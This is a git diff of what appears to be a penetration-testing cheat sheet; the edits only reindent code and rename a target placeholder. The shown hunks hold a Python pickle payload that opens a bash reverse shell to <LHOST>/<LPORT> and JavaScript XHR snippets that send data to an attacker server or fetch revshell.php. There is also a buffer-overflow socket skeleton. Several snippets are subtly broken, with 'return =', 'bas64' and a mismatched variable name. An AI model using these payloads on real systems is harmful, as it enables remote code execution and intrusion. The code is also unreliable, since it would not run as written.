@@ -79,13 +79,13 @@ import pickle
 import os
 
 class RCE:
-	def __reduce__(self):
-		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
-		return = os.system, (cmd, )
+    def __reduce__(self):
+        cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
+        return = os.system, (cmd, )
 
 if __name__ == '__main__':
-	pickle = pickle.dumps(RCE())
-	print(bas64.b64encode(pickled))
+    pickle = pickle.dumps(RCE())
+    print(bas64.b64encode(pickled))
 ```
 
 ### Python Redirect for SSRF
@@ -169,7 +169,7 @@ proxyDict = {
 // get a session
 r = requests.get('http://')
 // send request
-r = requests.post('<TARGET_URL>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
+r = requests.post('<DOMAIN>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
 ```
 
 ### XML HTTP Request (XHR) in JavaScript
@@ -198,7 +198,7 @@ xhr.send();
 
 ```c
 myhttpserver = 'http://<LHOST>/'
-targeturl = 'http://<TARGET_URL>/'
+targeturl = 'http://<DOMAIN>/'
 
 req = new XMLHttpRequest;
 req.onreadystatechange = function() {
@@ -216,7 +216,7 @@ req.send();
 
 ```c
 req = new XMLHTTPRequest;
-req.open('GET',"http://<TARGET_URL>/revshell.php");
+req.open('GET',"http://<DOMAIN>/revshell.php");
 req.send();
 ```
 
@@ -355,14 +355,14 @@ port = 9999
 buffer = #TBD
 
 try:
-	print '[+] Sending buffer'
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((address,port))
-	s.recv(1024)
-	s.send(buffer + '\r\n')
+    print '[+] Sending buffer'
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((address,port))
+    s.recv(1024)
+    s.send(buffer + '\r\n')
 except:
- 	print '[!] Unable to connect to the application.'
- 	sys.exit(0)
+    print '[!] Unable to connect to the application.'
+    sys.exit(0)
 finally:
-	s.close()
+    s.close()
 ```
